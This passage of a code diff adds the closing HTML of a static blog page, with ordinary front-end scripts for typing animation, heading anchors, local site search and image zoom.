+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
